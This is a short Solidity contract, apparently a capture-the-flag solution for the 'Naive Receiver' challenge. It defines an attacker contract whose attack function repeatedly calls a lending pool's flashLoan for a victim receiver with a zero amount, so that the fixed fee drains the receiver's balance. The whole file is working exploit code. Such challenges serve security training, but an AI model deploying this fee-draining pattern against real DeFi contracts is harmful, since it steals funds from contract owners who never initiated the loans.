// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveReceiverAttacker {
    NaiveReceiverLenderPool pool;

    constructor(address payable poolAddress) {
        pool = NaiveReceiverLenderPool(poolAddress);
    }

    function attack(address receiver) public {
        while (receiver.balance >= pool.fixedFee()) {
            // any arbitrary number for borrowAmount is okay
            pool.flashLoan(receiver, 0);
        }
    }
}
